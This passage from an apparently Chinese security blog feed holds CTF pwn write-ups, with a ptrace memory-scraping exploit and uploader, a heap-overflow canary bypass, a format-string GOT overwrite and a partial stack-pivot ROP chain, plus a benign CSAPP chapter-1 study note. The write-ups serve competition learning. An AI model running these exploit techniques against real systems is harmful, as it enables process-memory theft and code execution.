文件删除掉，最后有一个永真循环，不断打印休眠打印字符串（目的是让进程一直处于运行状态，不会结束）</p><h3 id="利用思路：-v2">利用思路：</h3><p>因为将 <code>/proc/sys/kernel/yama/ptrace_scope</code> 设置为了 <code>0</code>,并且权限为 <code>root</code> 。因此可以使用 <code>ptrace</code> 接口来访问进程的内存。</p><p>首先执行命令 <code>ps -ef</code> 获取进程的 <code>PID</code> ，再用 <code>/proc/pid/maps</code> 获取栈地址，因为此时的进程依然在运行，所以 <code>flag</code> 依然存在到栈上，调用 <code>ptrace</code> 获取栈内数据比对 <code>flag</code> ，比对成功的话，就将接下来内存中的数据打印出来，从而获取 <code>flag</code> 。</p><p>而上面所说的比对并打印 <code>flag</code> 需要用C语言的脚本来实现，因为是第一次做这种题目，所以直接把官方的 <code>WP</code> 中的 <code>exp</code> 贴到这里了（主要感觉这种轮子没必要再去自己写一个，直接用或者根据需求再改改就挺好）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="comment">//cat /proc/131/maps</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argv , <span class="type">char</span> **argc)</span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> data ;</span><br><span class="line">  <span class="type">int</span> stat ;</span><br><span class="line">  <span class="type">int</span> pid = atoi(argc[<span class="number">1</span>]) ;<span class="comment">//这里需要手动传入命令行参数 target的pid</span></span><br><span class="line">  ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>) ;</span><br><span class="line">  wait(&amp;stat) ;    <span class="comment">// 如果不wait，马上进行下一个ptrace的PEEK操作会造成 no such process 错误</span></span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr = <span class="number">0</span> ;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%llx&quot;</span>,&amp;addr);</span><br><span class="line">  <span class="keyword">for</span> (; addr &lt; <span class="number">0x7ffffffff000</span>; ++addr)</span><br><span class="line">  &#123;</span><br><span class="line">    data = ptrace(PTRACE_PEEKDATA, pid, addr, <span class="literal">NULL</span>);    <span class="comment">// 一次读一个字节</span></span><br><span class="line">    <span class="keyword">if</span>(data==<span class="number">0x65636165</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;data = %x , addr = %llx\n&quot;</span> , data , addr) ;</span><br><span class="line">      <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> addr1=addr<span class="number">-1</span>;</span><br><span class="line">      <span class="type">char</span> data1;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">      &#123;</span><br><span class="line">        addr1+=<span class="number">1</span>;</span><br><span class="line">        data1 = ptrace(PTRACE_PEEKDATA, pid, addr1, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">//write(1,data1,0x10);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span> , data1) ;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个脚本我们是无法在远程的环境上编写并编译的，所以我们得在本地编译好，然后用 <code>python</code> 脚本将 <code>exp</code> 进行 <code>base64</code> 编码，然后上传到远程环境。</p><p><code>python</code> 脚本如下：</p><p>这个依然是官方的 <code>python</code> 脚本。作用就是将 <code>exp</code> 上传到远端环境中。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./boot.sh&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="number">61265</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    io.sendline(cmd)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;# &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">exp</span>):</span><br><span class="line">    p = log.progress(<span class="string">&quot;exp&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./&quot;</span>+exp, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;# &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">600</span>):</span><br><span class="line">        p.status(<span class="string">&quot;%d / %d&quot;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">&quot;echo \&quot;%s\&quot; &gt;&gt; /tmp/benc&quot;</span> % (encoded[i:i+<span class="number">600</span>]))</span><br><span class="line"></span><br><span class="line">    exec_cmd(<span class="string">&quot;cat /tmp/benc | base64 -d &gt; /tmp/exp&quot;</span>)</span><br><span class="line">    exec_cmd(<span class="string">&quot;chmod +x /tmp/exp&quot;</span>)</span><br><span class="line">upload(<span class="string">&#x27;exp&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301131842540.png" alt="image-20230113184223347"></p><h2 id="参考文章：">参考文章：</h2><p><a href="https://xia0ji233.pro/2023/01/01/Nepnep-CatCTF2022/#injection2-0%F0%9F%92%89">攻防世界 x Nepnep x CATCTF 2022 Nepnep战队官方WP | xia0ji233’s blog</a></p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈迁移 </tag>
            
            <tag> 沙箱 </tag>
            
            <tag> C++ </tag>
            
            <tag> 栈溢出 </tag>
            
            <tag> 进程注入 </tag>
            
            <tag> 上传脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-第一章 计算机系统漫游（笔记）</title>
      <link href="/posts/6329566d.html"/>
      <url>/posts/6329566d.html</url>
      
        <content type="html"><![CDATA[<p>​这个第一章，主要是介绍了计算机上的一些专业术语，以及一些最基础的概念（并没有深入讲解，不过会在后面的章节进行探究）。<strong>不过这些概念彼此之间联系不大，并不是循序渐进的，因此这一章，我单独介绍里面出现的术语</strong>。</p><h1>计算机系统是个啥？操作系统又是个啥？</h1><p>​这一章的名字叫做计算机系统漫游，别的不说，就光看名字，这个计算机系统是什么？我们平常提到的操作系统又是啥，怎么去理解它？</p><h2 id="计算机系统是什么？">计算机系统是什么？</h2><p>​这个<strong>计算机系统</strong>啊，其实第一章的第一句话就给出定义了，<strong>它是由硬件和系统软件组成的</strong>，他们共同工作来运行应用程序。其实这就是一个很大的范围，<strong>就可以简单理解为计算机系统就是包括了软件系统和硬件系统</strong>。</p><h2 id="操作系统是什么？">操作系统是什么？</h2><p>​这个操作系统其实没有计算机系统那么抽象，<strong>你完全可以把它理解成一个软件</strong>（CSAPP中提到我们可以把操作系统看成是应用程序与硬件之间插入的一层软件），<u>只不过这个软件相比于其他软件不同之处在于可以去管理计算机的硬件以及计算机的资源</u>。它存在的意义就是去为了更方便用户来控制我们的电脑。<em>操作系统位于底层硬件与用户之间，是两者沟通的桥梁。用户可以通过操作系统的用户界面，输入命令。操作系统则对命令进行解释，驱动硬件设备，实现用户要求。</em></p><h2 id="现在知道了操作系统的概念，那我们平常提到的32位和64位操作系统又是个什么玩意？">现在知道了操作系统的概念，那我们平常提到的32位和64位操作系统又是个什么玩意？</h2><p>​这里我以64位程序为例，这个64位的这个单位其实是Bit(比特)，而一个比特呢，就是我们所说的二进制中的一个0或1。为什么正好是64位比特呢，这是因为我们使用的这个CPU，一次性处理的就是64个比特的数据（你可以姑且这么理解），但事实上一次处理64个比特的数据并不全是CPU的意思。其实这跟总线也有一部分关系，在书中的原话是这样描述总线的。</p><blockquote><p>​贯穿整个系统的是一组电子管道，称作总线，它携带信息字节并负责在各个部件间传递。通常总线被设计成传送定长的字节块，也就是字（word）。字中的字节数（即字长）是一 个基本的系统参数，各个系统中都不尽相同。现在的大多数机器字长要么是4个字节（32 位），要么是8个字节（64位）。</p></blockquote><p>​由此可以看出，是传输信息的时候，就已经把这些信息给划分成了固定的长度。就比如64位程序，那它传输的数据，就是把64个比特划分成了一个定长，然后传输给CPU。毕竟接收的数据都是64位比特位一组了，那处理起来，自然也要是64位比特为一组。看一下书中怎么介绍CPU的</p><p><em>处理</em>器</p><blockquote><p><em>中央处理单元（CPU）,简称处理器，是解释（或执行）存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（或寄存器），称为程序计数器（PC）。在任何时刻，PC都指向主存中的某条机器语言指令（即含有该条指令的地址）。</em><br><u>从系统通电开始，直到系统断电，处理器一直在不断地执行程序计数器指向的指令, 再更新程序计数器，使其指向下一条指令</u>在这个模型中，指令按照严格的顺序执行，而执行一条指令包含执行一系列的步骤。处理器从程序计数器指向的内存处读取指令，解释指令中的位，执行该指令指示的简单操作，然后更新PC,使其指向下一条指令, 而这条指令并不一定和在内存中刚刚执行的指令相邻。*</p></blockquote><p>​<strong>可以看到CPU和总线在设计的时候，都被刻意设置成了一次处理或传输一个字。而这个字的大小就决定了这个程序是个32位的还是64位的。</strong></p><p>程序编译成可执行文件的四个阶段</p><p>一个程序刚写完的时候，它其实是这样的。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304171313301.png" alt="image-20230417131308240"></p><p>但此时它并不是我们最终要的ELF（Linux下的可执行文件）程序，需要经过编译之后，才能变成我们能够执行的ELF文件（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304171313433.png" alt="image-20230417131335367"></p><p>此时单单看大小，你应该就会产生一个疑问，刚写完的时候，大小是70字节，结果编译成了可执行文件，咋就成了8.2KB，大小直接翻了将近120倍，为什么会这样？</p><p>这时候我们就要聊聊这个程序被编译成ELF文件的四个阶段了。</p><h2 id="1、预处理阶段">1、预处理阶段</h2><p>这个阶段最主要的事情，就是把#后面的内容去用代码替换掉，就比如#include&lt;stdio.h&gt;这句话，在预处理阶段，这句话会消失，取而代之的是很长的代码。我们先写一个hello world源文件，然后用gcc -E hello.c去编译一下。</p><p><img src="../img/2706180-20220215105925287-2109179106.png" alt=""></p><p>可以发现，原本的#include&lt;stdio.h&gt;没了，变成了一些代码（这张图片没有展示完全，因为代码太多了，就截取了一小部分）不过我们写的main函数的代码还在。</p><h2 id="2、编译阶段">2、编译阶段</h2><p>这个阶段就是通过编译器，把我们写的c的高级语言代码变成了汇编指令。通过gcc -S hello.c命令可以编译出来hello.s文件。</p><p><img src="../img/2706180-20220215105929045-624871612.png" alt=""></p><h2 id="3、汇编阶段">3、汇编阶段</h2><p>汇编阶段就是把上个阶段得到的汇编指令给翻译成机器语言指令（就是二进制指令），也就是说此时经过了汇编阶段后，我们再查看编译得到的文件，得到的就全都是乱码了。用gcc -c hello.c命令去编译。此时的文件也就是目标文件（被编译好了，不过还没有进行链接的文件）</p><p><img src="../img/2706180-20220215105932332-2146993747.png" alt=""></p><h2 id="4、链接阶段">4、链接阶段</h2><p>就比如这个最简单的hello world的程序，你有没有想过，凭什么printf函数它就可以去打印。其实奥秘就在这个链接阶段，这个printf函数的背后也是有很多的代码（绝不是你表面上看起来的printf()这一个单词）只不过这个printf函数的代码已经提前被写好了，并且也被打包成了一个目标文件。因此在链接阶段只需要将需要的目标文件都合并到一起，就成为了最后的ELF文件。</p><h2 id="编译系统">编译系统</h2><p>最后可以看一下整体的过程，如下图。并且执行这四个阶段的程序（预处理器、编译器、汇编器和链接器）一起构成了编译系统</p><p><img src="../img/2706180-20220215110251028-1658054176.png" alt=""></p><h1>什么是shell</h1><p>shell本质上就是个程序，不过我通常把它理解为终端。事实上shell只是一个命令行解释器（这个解释的更好一些）（也就意味着其实它并不包括可视化界面，不过你把它理解成终端也没什么问题的）（具体介绍的话，书中已经详细写了，这里就不再赘述了）<br><img src="../img/2706180-20220215105936187-1610462697.png" alt=""></p><h1>虚拟内存&amp;&amp;高速缓存&amp;&amp;主存</h1><p>这里我只是先简单介绍一下这三者，在以后的笔记中，会详细讨论他们三个。</p><h2 id="1、先谈谈主存">1、先谈谈主存</h2><pre><code>首先主存就是内存，这俩是一回事。当一个程序运行的时候，这个程序就会被加载到内存里面，以便CPU进行数据处理，简单来说内存就是用于暂时存放CPU中的运算数据。在书中强调说，主存是一个临时存储设备，为什么这是个临时的呢？因为它通电才会进行存储，断电后内存中的数据就会消失。如果单听解释太抽象的话，这里来举两个例子。如果你在用word写一个文档，你在敲击每一个字到word中的时候，此时它们是存储到了内存中，如果你点击了保存，那么它们才存到了磁盘中。如果你开了一局游戏，此时这个游戏其实就是在内存中进行。</code></pre><p><em>从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址（数组索引），这些地址是从零开始的。</em></p><p>从书中的这句话，我们可以知道其实这个存储器，就可以把它理解为一个旅馆，其中有一个一个的小房间，每个房间都是有一个唯一的号码。</p><p>此时问题就来了，我们如果开了两个游戏呢，我们知道一个游戏，是一个进程，这个进程对应着自己的内存，可是如果两个进程呢，或者更多个进程呢？我们有那么多内存去分配给他们么？此时我们引入了虚拟内存这个概念。</p><h2 id="2、虚拟内存">2、虚拟内存</h2><p>虚拟内存细了讲是有很多东西的，这里简单解释一下。虚拟内存出现的其中一个目的就是去解决我上面说的那个问题（去“创造”出来更多的内存来供我们使用）这里的创造，我加了引号，事实上它并不是创造，而更像是一种欺骗，<strong>一个叫做MMU的东西，去欺骗了每个进程，当每个进程准备提供给CPU数据的时候，MMU才会把那些数据放到内存里面，不然的话，那些不用的数据时一直存放在磁盘中（这样真正的内存存储的都是与CPU即将交换的数据，这样就类似于“创造”了更多的内存）</strong>。不过进程本身是不知道这件事情的，进程一直以为自己是独占了整个内存的使用。</p><h2 id="3、高速缓存">3、高速缓存</h2><p>**这个高速缓存其实就是比内存传输数据更快的东西。**传输数据最快的是寄存器，因为寄存器本身就在CPU上，然后就是高速缓存，接着是内存，最后是外存。越往后传输速度越慢，但是存储的内容更多。</p><p><img src="../img/2706180-20220215105940453-1971369963.png" alt=""></p><p>缓存也没什么好说的，主要是原文已经写的很明白了。最后就是高速缓存的目的就是去提升计算机系统的处理速度。</p><h1>什么是进程和线程？</h1><h2 id="1、进程">1、进程</h2><p>写好的程序，它是放在磁盘上的，如果我们去运行它，ok，它就变成了进程。<strong>可以说被运行的程序就是进程</strong>。既然是被运行了，那进程肯定是在内存中的。下面是进程在内存中的布局。</p><p><img src="../img/2706180-20220215105944333-1401735974.png" alt=""></p><p>现在我们只要初步了解一下进程即可。<u>并且进程彼此独立互不干扰的；另外每个进程都认为自己是在独占着CPU，但事实上我们系统中一定不是就一个进程，因此在实际的进程切换中，就会进行上下文切换（这个上下文就是一种状态，例如PC和寄存器文件的当前值等等），保存当前上下文，恢复新进程的上下文。</u></p><h2 id="2、线程">2、线程</h2><p><em><strong>线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中</strong>，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。</em></p><p>进程之间是彼此独立的，<u>而线程只要是所属于一个进程之下，那他们之间就可以共享一个进程的资源以及地址空间。并且多个线程可以读写同一快内存</u>。<strong>由于进程彼此是独立的，在安全性上略胜一筹，而多个线程是可以读写同一个内存，因此在速度上有优势。</strong></p><h1>什么是I/O</h1><p>我最早的时候，经常看到网上的文章说I/O，但是一直不理解，其实它没什么好神秘的，<strong>I/O的意思就是输入（Input)和输出(Output)</strong>，只要具有输入输出类型的交互系统都可以认为是I/O系统。<u>就比如我们的键盘和鼠标就是输入设备，而显示器则是输出设备，甚至磁盘也是输出设备（尽管这个我们看不见，但是数据确实是被输出到了磁盘中）</u>，每个I/O设备都是通过一个控制器或适配器与I/O总线相连。</p><h1>什么是文件</h1><p><strong>文件就是字节序列（字节序列可能有点抽象，简单来说，就是很多个字节集合放到了一起）</strong>，并且在linux中，万物皆为文件（包括磁盘、键盘、显示器等等）。</p><h1>平常说的CPU到底是个啥</h1><p><strong>CPU是指中央处理器，通俗来讲就是读取指令然后执行然后再读取，用不停歇直到断电</strong>。它作为计算机系统的运算和控制核心，是信息处理、程序运行的最终执行单元。CPU里面分为三个很重要的部分，分别是ALU（算术逻辑单元），寄存器组，控制单元。</p><h2 id="ALU">ALU</h2><p>是CPU的核心，因为它是负责计算的</p><h2 id="寄存器组">寄存器组</h2><p>实质上就是CPU中暂时存放数据的地方，里面保存着等待处理和处理过的数据。</p><h2 id="控制单元">控制单元</h2><p>简单来说，控制单元就是来指挥CPU内部的工作的。</p><h1>并发和并行&amp;&amp;超线程</h1><p>简单来说，并发就是两个事件或多个事件在一个时间依次发生；而并行则是两个时间或多个事件在一个时间同时发生。</p><h2 id="并发">并发</h2><p>我们知道如果只有一个CPU的话，那么它在某一时刻也只能执行一个线程，因此它要执行多个线程，就只能把时间分成若干段，然后把每一段时间分别分配给每个线程。在某一时刻线程代码在运行时，其他线程是处于挂起状态。</p><h2 id="并行">并行</h2><p>可如果我们拥有了多个CPU，那每一个CPU都可以在一个时刻去处理一个线程，从而系统在操作的时候，就可以同时处理多个线程（且线程之间互不抢占CPU的资源），这就是并行。</p><p>可是即使只有一个CPU，在用户看来，系统似乎还是可以同时处理多个线程，那是因为CPU处理的速度是在太快了，使多个线程快速交替进行，从而给人的感觉是在同一个时间处理了多个线程。</p><h2 id="超线程">超线程</h2><p>如果理解了前面的并行之后，超线程（有时也被称为多线程）就不难理解了，它可以让一个CPU能够到达线程级并行计算。大概是通过备份一些CPU的硬件，比如寄存器文件和程序计数器等等，尽管此时的CPU可以同时处理两个线程，但除去刚才提到的寄存器文件和程序计数器，其他硬件依然是被共享的。</p><p>参考文章 <a href="https://www.zhihu.com/question/497245883">https://www.zhihu.com/question/497245883</a><br>图片链接 <a href="https://www.php.cn/faq/422175.html">https://www.php.cn/faq/422175.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF NOV X联合出题人2022年度积分榜争夺赛 pwn部分wp</title>
      <link href="/posts/ffd20e6e.html"/>
      <url>/posts/ffd20e6e.html</url>
      
        <content type="html"><![CDATA[<h2 id="签个到">签个到</h2><h3 id="保护策略">保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011047418.png" alt="image-20221201104720121"></p><p>没开NX，但是对于本题来说没啥用，因为程序给了后门函数</p><h3 id="程序逻辑">程序逻辑</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011048486.png" alt="image-20221201104846427"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011052461.png" alt="image-20221201105203859"></p><p>最初这里有个输入的地方存在off by one漏洞，结合到下面的%s输出考虑到可能是泄露数据，发现写入的地方紧挨canary，因此这里将canary泄露出来。</p><p>而后程序给了两个功能，一个是申请出来一个0x20的堆块，在向堆块里输入数据的时候存在一个漏洞。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011058480.png" alt="image-20221201105840410"></p><p>上面的这个a2可控，将其置成0。这样判断就是v5&lt;=-1，而v5是无符号整形因此在判断的时候-1也会转成无符号整形，也就是0xffffffff，从而导致了堆溢出。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011101525.png" alt="image-20221201110128458"></p><p>另一个函数是进行了三个判断，如果全部通过的话则触发后门函数。</p><p>正常来说的话是无论如何也不会通过检查的，因为在第三个检查的地方是在拿堆块里的数据与canary做比较，但是正常来说申请完堆块第一个内存单元是0x00000886,这样跟canary比较是不可能通过的。</p><h3 id="利用思路">利用思路</h3><p>但是赋值为0x886的时候发现有个判断，如下</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011105526.png" alt="image-20221201110531488"></p><p>也就是说如果申请的堆块本身在v2的位置就有数据，那么就不会对v2再进行赋值了，联想到上面提到的堆溢出，利用思路就是直接溢出top chunk,不改变其size，但是在其用户区提前布置好canary，这样下次申请的新堆块在v2的位置本身就有数据了，从而通过最后的检查。</p><h3 id="EXP">EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn_5&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25028&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x9</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">9</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;canary&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;power length: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;data: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0xc</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x20d51</span>)+p64(canary)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,p64(canary)[<span class="number">4</span>:])</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x17E3</span>,<span class="number">0x181E</span>,<span class="number">0x182A</span>,<span class="number">0x168F</span>)  </span><br><span class="line">cmp(p64(canary)[<span class="number">4</span>:])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011110205.png" alt="image-20221201111058054"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 整形溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X CBCTF 2022九月挑战赛 pwn部分wp</title>
      <link href="/posts/da4f7b20.html"/>
      <url>/posts/da4f7b20.html</url>
      
        <content type="html"><![CDATA[<h2 id="cyberprinter">cyberprinter</h2><h3 id="保护策略：">保护策略：</h3><p><img src="../img/2706180-20220919100434467-653241350.png" alt=""></p><h3 id="漏洞所在：">漏洞所在：</h3><p><img src="../img/2706180-20220919100444183-1653075701.png" alt=""></p><p>首先是printf函数%s可以泄露一个libc地址(让输入写满)，然后存在一个格式化字符串的洞，但是if进行了一些检查，无法利用%p或者%x来泄露地址，出题人这里仅仅就是想让我们去任意写而非任意读。</p><h3 id="利用思路：">利用思路：</h3><p>由于程序是系统调用exit退出的，因此无法劫持exit里的结构体指针。</p><p>发现printf执行后，执行了一个puts，考虑去劫持IO里的某些指针。考虑去伪造stdout结构体里的vtable指针，控制其偏移，让__xsputn落在one_gadget上即可。但实际操作的时候发现vtable这个基地址中出现了0x78，结果导致了if判断时被过滤掉了，因此这个思路也断了。</p><p>经过roderick和winmt师傅的提示，这题采用一种新的思路，来劫持libc中的got表。</p><p>本题的libc保护如下：</p><p><img src="../img/2706180-20220919100457611-1949132916.png" alt=""></p><p>可以看见保护是Partial RELRO，这就意味着我们可以篡改其函数的got表。</p><p>而puts函数又调用了strlen函数，也就是在libc中执行puts函数时，又通过strlen函数的got表跳转到了strlen函数。</p><p>我们去劫持strlen函数的got表为one_gadget即可。</p><h3 id="EXP">EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;print&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26047&quot;</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x13A0,0x13E9)</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Your name?pls..\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x1ec5c0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">strlen_addr=libc_base+<span class="number">0x1EB0A8</span><span class="comment">#libc中strlen函数的got表地址</span></span><br><span class="line">one_gadget=search_og(<span class="number">1</span>)+libc_base</span><br><span class="line">log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">payload=fmtstr_payload(offset=<span class="number">8</span>,writes=&#123;strlen_addr:one_gadget&#125;,numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;But there is sth wrong in it,so you can&#x27;t do sth&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007232808150.png" alt="image-20221007232808150"></p><h2 id="appetizer">appetizer</h2><h3 id="保护策略：-v2">保护策略：</h3><p><img src="../img/image-20221007232818671.png" alt="image-20221007232818671"></p><h3 id="漏洞所在：-v2">漏洞所在：</h3><p><img src="../img/image-20221007232830424.png" alt="image-20221007232830424"></p><p>这里存在一个溢出，虽然不会溢出到返回地址，但是后八个字节决定了下图read是往哪里输入的。</p><p><img src="../img/image-20221007232842582.png" alt="image-20221007232842582"></p><p><img src="../img/image-20221007232853757.png" alt="image-20221007232853757"></p><p>上图这里泄露了一个地址，通过这个我们可以拿到程序基地址，而且这个地址也是接下来read往里面输入了0x108字节的地址。</p><h3 id="利用思路：-v2">利用思路：</h3><p>其实这道题的意图很明显，出题人应该是想让我们迁移到这里(如下图)，因为这里我们是可以把rop链布置到这里的。</p><p><img src="../img/image-20221007232903914.png" alt="image-20221007232903914"></p><p>然后去打rop，同时因为禁用了execve，因此最终应该是考虑打orw。</p><p>我们先看看如何迁移到这个地址上。</p><p>首先通过调试，我们发现如果我们在第一次输入里，最后的字节发8个a，那么最后一次的read的buf就会变成一堆a(如下)</p><p><img src="../img/image-20221007232953300.png" alt="image-20221007232953300"></p><p>这个地址表面上是我们可控的，但是我们没有栈地址，因此其实是控制不了程序的执行流的。不过这里我观察了一下，这个read的buf正常的值(也就是不利用第一次输入的那个溢出)(如下)就是rbp，而正好可以控制rbp的值和返回地址(这也就是我们打栈迁移的条件)</p><p><img src="../img/image-20221007233119819.png" alt="image-20221007233119819"></p><h4 id="rop链的构建">rop链的构建</h4><p>然后我们那边的rop链的思路是先泄露libc地址，然后再执行一次read读进来一条新的rop链来打orw。但难点是我们无法控制rdx寄存器，导致read函数用残留的rdx中数据直接读的话，只能读进来16个字节的数据。(而这新读的16个字节数据，就可以使用libc里的gadget地址了)，因此我们使用一个libc里的pop rdx的gadget再执行一次read函数，来读入更多的数据。</p><p>先说第一条链的第一部分（使用write函数进行libc地址的泄露（如下图），不知道为啥我这里用puts泄露不了）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(e.got[<span class="string">&#x27;write&#x27;</span>]+base_addr)+p64(<span class="number">0</span>)+p64(e.plt[<span class="string">&#x27;write&#x27;</span>]+base_addr)</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007233132958.png" alt="image-20221007233132958"></p><p>再说第一条链的第二部分（这个部分的意义就是把libc里这个pop rdx的gadget给读到内存里来，这里read函数的第二个参数需要布局一下）（如下图）</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(base_addr+<span class="number">0x40d8</span>)+p64(<span class="number">0</span>)+p64(e.plt[<span 